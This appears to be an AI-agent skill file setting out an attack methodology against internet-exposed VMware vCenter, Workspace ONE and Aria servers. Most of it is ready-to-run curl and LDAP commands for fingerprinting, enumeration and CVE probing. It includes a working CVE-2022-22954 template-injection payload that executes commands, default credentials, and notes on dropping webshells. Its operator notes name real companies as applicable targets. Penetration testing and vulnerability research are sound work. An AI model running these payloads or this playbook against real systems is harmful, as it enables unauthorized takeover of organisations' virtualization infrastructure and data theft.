---
name: vmware-vcenter-attack
description: "VMware vCenter Server, Workspace ONE, Aria/vRealize attack methodology — version fingerprinting, high-impact CVE chains (CVE-2021-21972/21985/22005 pre-auth RCE, CVE-2022-22954 SSTI, CVE-2023-34048 DCERPC OOB write, CVE-2024-37085 ESXi AD bypass), default credentials, SSO/vmdir LDAP enumeration, MOB disclosure, ESXi OpenSLP RCE. Use when recon shows vCenter banner, /ui redirect, /websso/SAML2/Metadata, or VMware product fingerprints on internet-exposed hosts."
---

## When to use

Trigger when external recon shows ANY of:
- Banner: "VMware vCenter Server", "VMware vSphere Client"
- URL paths: `/ui`, `/ui/login`, `/websso/SAML2/Metadata`, `/sdk`, `/mob` (Managed Object Browser)
- TLS cert SAN includes `vcenter` / `vsphere` / `vcsa` / `psc` / `vmware`
- Workspace ONE Access / Identity Manager: `/SAAS`, `/SAAS/auth`, `/SAAS/login`, `/SAAS/horizon`
- VMware Aria / vRealize: `/vco`, `/vco-controlcenter`, `/orchestrator`, `/lcm/api/v1`
- Horizon View: `/portal`, `/admin`

Do NOT use for:
- Internal-network vCenter (out of scope — external boundary discipline)
- Pure ESXi hypervisor exposed without management plane (rare on internet; flag as separate finding)

---

## Step 1 — Version fingerprinting

```bash
TARGET="vcenter.target.com"

# Build info endpoint (often public; revealing exact patch level)
curl -sk "https://$TARGET/sdk/vimServiceVersions.xml"

# UI build (visible in page source)
curl -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
curl -sk "https://$TARGET/ui/" | grep -oE 'vsphere[^"]{0,40}'

# REST API version (vSphere 7+)
curl -sk "https://$TARGET/api/appliance/system/version"

# Cert metadata
echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alt"

# SSO Admin Service (info disclosure)
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local"
```

Map build → version → CVE applicability via VMware advisories.

---

## Step 2 — CVE matrix (external-exploitable, sorted by historical impact)

| CVE | Affected | Vector | Status |
|---|---|---|---|
| **CVE-2024-37085** | ESXi 7.0/8.0 < specific patch | AD group "ESX Admins" auto-admin bypass | High — Domain takeover → ESXi RCE, exploited in ransomware ops |
| **CVE-2024-22273** | ESXi/Workstation/Fusion/vCenter storage controller | OOB read/write — requires VM-local access (NOT pre-auth network SSRF) | Important (CVSS 8.1), not external pre-auth |
| **CVE-2023-34048** | vCenter 7/8 < specific build | DCE/RPC pre-auth heap OOB write → RCE | Critical, patched 2023-10 |
| **CVE-2023-20887** | Aria Operations for Networks | Pre-auth command injection → RCE | Critical |
| **CVE-2023-20892** | vCenter 7/8 | Use-after-free in DCE/RPC | High |
| **CVE-2022-31656/31659** | Workspace ONE Access 21.x | Pre-auth SSRF + auth bypass | Critical chained |
| **CVE-2022-22954** | Workspace ONE Access | Pre-auth server-side template injection (SSTI) → RCE | Critical, widely exploited |
| **CVE-2021-22005** | vCenter 6.7/7.0 < build | Analytics service pre-auth file upload → RCE | Critical |
| **CVE-2021-21985** | vCenter 6.5/6.7/7.0 < build | vSAN Health Check plugin pre-auth RCE | Critical |
| **CVE-2021-21972** | vCenter 6.5/6.7/7.0 < build | vRealize plugin `/ui/vropspluginui/rest/services/uploadova` pre-auth file upload → RCE | Critical, exploited heavily |
| **CVE-2020-3992** | ESXi OpenSLP | Pre-auth use-after-free → RCE | Critical, ESXi ransomware vector |
| **CVE-2019-5544** | ESXi OpenSLP | Pre-auth heap overflow | Critical |

---

## Step 3 — CVE-2021-21972 probe (still common on stale appliances)

```bash
# Detection only — DO NOT execute the file upload without explicit scope OK
curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/uploadova"
# 405 → endpoint exists, version vulnerable
# 404 → patched (endpoint removed)
# 401 → patched (auth required)

curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
```

---

## Step 4 — CVE-2022-22954 (Workspace ONE SSTI) probe

```bash
# Stage A — detection only: reachability + baseline
curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
  "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=probe"
# 4xx with FreeMarker/catalog-portal error template → endpoint present, candidate vulnerable.
# 404 → patched/removed.

# Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary
CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"
# Confirmed RCE ONLY if response contains exact $CANARY echoed back AND "uid=" output
# that is absent from Stage-A baseline.
```

---

## Step 5 — Default credentials (frequently still valid on lab/staging)

| Product | Default user | Default password |
|---|---|---|
| vCenter 6.x | `administrator@vsphere.local` | `<set-during-install>` |
| vCenter Appliance root | `root` | `vmware` (legacy) or `<set>` |
| ESXi root | `root` | `<blank>` or `vmware` |
| vCenter Server Appliance Mgmt (5480) | `root` | `<set-during-install>` |
| Aria Operations | `admin` | `vmware` (legacy) |

**Do not spray vCenter** — `administrator@vsphere.local` has VERY low lockout threshold (often 3 attempts → 60s lockout). One attempt with high-confidence guess only.

---

## Step 6 — SSO / vmdir LDAP enumeration

```bash
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local" | xmllint --format -
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"

# Try anonymous LDAP bind to vmdir (port 389/636 if exposed)
ldapsearch -x -H "ldap://$TARGET:389" -b "" -s base
ldapsearch -x -H "ldap://$TARGET:389" -b "cn=Configuration,cn=vmware,cn=cis,dc=vsphere,dc=local"
```

---

## Step 7 — Managed Object Browser (MOB) — frequently leaks data

```bash
curl -skI "https://$TARGET/mob"
# 401 → auth required (good defense)
# 200 → MOB exposed → can browse VMs, hosts, datastores, sessions without creds

# Auth'd MOB:
curl -sk -u 'administrator@vsphere.local:<pw>' "https://$TARGET/mob/?moid=ServiceInstance&doPath=content"
```

---

## Step 8 — vSphere REST API enumeration (post-cred)

```bash
# Get session token
curl -sk -X POST -u 'user@vsphere.local:<pw>' "https://$TARGET/api/session"

# List VMs
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/vm"

# List hosts
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"

# Datastores
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"

# Datastore file download
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
```

---

## Step 9 — Workspace ONE Access specific paths

```bash
curl -sk "https://$TARGET/SAAS/auth/saml/response"
curl -sk "https://$TARGET/SAAS/auth/wsfed/services/idp"
curl -sk "https://$TARGET/SAAS/jersey/manager/api/health"
curl -sk "https://$TARGET/catalog-portal/services/airwatch/identifiers"
curl -sk "https://$TARGET/SAAS/login/0"
```

---

## Step 10 — Aria / vRealize specific paths

```bash
# vRealize Operations Manager
curl -sk "https://$TARGET/suite-api/api/versions"
curl -sk "https://$TARGET/casa/nodes/thumbprints"

# Aria Automation
curl -sk "https://$TARGET/csp/gateway/am/api/about"
curl -sk "https://$TARGET/cluster-administration/api/health"

# vRealize Orchestrator
curl -sk "https://$TARGET/vco/api/about"
curl -sk "https://$TARGET/vco-controlcenter/api/health"
```

---

## Disclosed CVEs — detailed references

### CVE-2021-21972 — vCenter `vropspluginui` unauth arbitrary file upload
- **Affected:** vCenter 6.5 < 6.5 U3n, 6.7 < 6.7 U3l, 7.0 < 7.0 U1c. VMware Cloud Foundation 3.x/4.x.
- **Attack:** Unauth POST to `/ui/vropspluginui/rest/services/uploadova` with tar containing path-traversal entry. Windows: write webshell.jsp as SYSTEM. Linux: drop authorized_keys.
- **Root cause:** vRealize Operations plugin endpoint lacked authentication filter + no path sanitization.
- **CISA KEV:** added 2021-11-03. Refs: VMSA-2021-0002, swarm.ptsecurity.com/unauth-rce-vmware/

### CVE-2021-21985 — vCenter vSAN Health Check pre-auth RCE
- **Affected:** vCenter 6.5 < 6.5 U3p, 6.7 < 6.7 U3n, 7.0 < 7.0 U2b.
- **Attack:** Unauth abuse of ProxygenController → Java unsafe reflection → arbitrary method invocation.
- Refs: VMSA-2021-0010, noahblog.360.cn/vcenter-server-rce/

### CVE-2021-22005 — vCenter Analytics service file upload → RCE
- **Affected:** vCenter 6.7 < 6.7 U3o, 7.0 < 7.0 U2d.
- **Attack:** Unauth POST to `/analytics/telemetry/ph/api/hyper/send` writes file outside intended directory.
- **CISA KEV:** added 2021-11-03. Refs: VMSA-2021-0020

### CVE-2022-22954 — Workspace ONE Access FreeMarker SSTI → RCE
- **Affected:** Workspace ONE Access 21.08.x, 20.10.x; Identity Manager 3.3.3-3.3.6; vRealize Automation 7.6.
- **Attack:** Unauth GET to `/catalog-portal/ui/oauth/verify?deviceUdid=${...}` → FreeMarker Execute → OS command as `horizon`.
- **CISA KEV:** added 2022-04-14. Refs: VMSA-2022-0011, srcincite.io/blog/2022/04/19/cve-2022-22954

### CVE-2022-22972 — Workspace ONE Access Host-header auth bypass
- **Affected:** Same product matrix as 22954.
- **Attack:** Manipulate HTTP Host header during local-domain login → server routes internal validation to attacker hostname → admin session without credentials.
- **CISA Emergency Directive 22-03** ordered federal agencies to patch within 5 days.

### CVE-2023-20887 — Aria Operations for Networks pre-auth command injection → RCE
- **Affected:** Aria Operations for Networks 6.2-6.10.
- **Attack:** Unauth Apache Thrift endpoint + shell metacharacter injection → root.
- **CISA KEV:** added 2023-06-22. Refs: VMSA-2023-0012

### CVE-2023-34048 — vCenter DCERPC pre-auth OOB write → RCE (APT-exploited zero-day)
- **Affected:** vCenter 7.0 < 7.0 U3o, 8.0 < 8.0 U1d/U2b.
- **Attack:** Crafted DCE/RPC packet → OOB write → code execution. Forensic tell: `vmdird` crash before backdoor.
- **Mandiant** attributed exploitation to **UNC3886** (China-nexus) since late 2021 — ~1.5-year zero-day window.
- **CISA KEV:** added 2024-01-22. Refs: VMSA-2023-0023

### CVE-2024-37085 — ESXi AD "ESX Admins" auth bypass (ransomware-favorite)
- **Affected:** ESXi 7.0/8.0 < specific patches.
- **Attack:** AD foothold → create group named `ESX Admins` → every member auto-granted full admin → SSH/API root on all domain-joined ESXi hosts.
- Exploited by **Storm-0506 (Black Basta), Octo Tempest, Manatee Tempest**.
- **CISA KEV:** added 2024-07-30. Refs: VMSA-2024-0013

### CVE-2020-3992 + CVE-2021-21974 — ESXi OpenSLP pre-auth RCE
- **Affected:** ESXi 6.5, 6.7, 7.0 prior to OpenSLP patches.
- **Attack:** Crafted SLP packet to port 427 → memory corruption → root.
- **ESXiArgs ransomware campaign** (Feb 2023) hit ~3,800 internet-exposed hosts via CVE-2021-21974 — two years after patch.

### CVE-2022-31656 — Workspace ONE Access auth bypass
- **Affected:** Workspace ONE Access 21.08.x; Identity Manager 3.3.3-3.3.6; vRealize Automation 7.6.
- **Attack:** Local-domain auth flow trusted a parameter suppliable without prior auth; chained with CVE-2022-31659 (auth'd RCE) for pre-auth admin RCE.

### CVE-2023-34063 — Aria Automation missing access control
- **Affected:** Aria Automation 8.11.x-8.14.x.
- **Attack:** Authenticated actor obtains unauthorized cross-organization access. CVSSv3 9.9.

---

## Key meta-references

- **CISA KEV catalog (VMware filter):** https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=vmware
- **Broadcom advisories:** https://support.broadcom.com/security-advisories
- **ZDI published:** https://www.zerodayinitiative.com/advisories/published/ (filter "VMware")
- **Mandiant UNC3886 reporting:** Google Cloud Threat Intelligence

**Pattern:** VMware management-plane CVEs are pre-auth, network-reachable, and mass-exploited within days of patch. Current-minus-one patch level = Critical same-day callout.

---

## Tooling

- **`vCenter-Exploit` collection** — multiple PoCs on GitHub for 21972, 21985, 22005
- **`nuclei`** templates: `vmware-vcenter-*.yaml`, `cve-2021-21972.yaml`, `cve-2022-22954.yaml`
- **`Metasploit`** modules: `exploit/multi/http/vmware_vcenter_*`

---

## Severity scoring guidance

| Finding | Severity |
|---|---|
| vCenter on internet, current patch | Informational (attack surface note) |
| vCenter on internet, missing patches with public RCE | **Critical** (entire virtualization plane compromise) |
| vCenter on internet + default admin password | **Critical** (immediate full takeover) |
| Workspace ONE on internet, unpatched 22954 | **Critical** |
| MOB anonymously accessible | **High** (full topology disclosure) |
| /sdk reachable + version disclosure only | **Medium** (info disclosure + attack-surface) |

---

## Anti-patterns

- **DO NOT spray vCenter SSO** — lockout is aggressive; one chance often
- **DO NOT execute file-upload PoCs without explicit OK** — they create persistent webshells
- **DO NOT confuse ESXi-management-on-internet with vCenter** — different attack surfaces; ESXi OpenSLP CVEs target port 427
- **DO NOT skip SSL handshake banner check** — VMware exposes versions there; lowest-noise initial probe

---

## Operator Notes (Battle-Tested)

- No own engagement experience yet — pattern adopted from community research, needs field validation
- Applicable targets: target-corp (xForce, corporate IdP), FIS (enterprise SSO), AS Watson (internal tools)

## Related Skills & Chains

| When | Go to |
|------|-------|
| vCenter SSO federated to Entra | m365-entra-attack |
| SAML SP metadata found on Workspace ONE | saml-bypass-techniques |
| Pre-auth RCE confirmed, need chain analysis | ssrf-testing |
| SSTI on Workspace ONE (CVE-2022-22954) | command-injection-testing |
| Exchange/OWA alongside vCenter | exchange-attacks |
| VPN appliance as entry point to vCenter | ssl-vpn-testing |
| Cloud IAM after vCenter cred extraction | cloud-attack-methodology |
| API testing on vSphere REST API | api-security-testing |
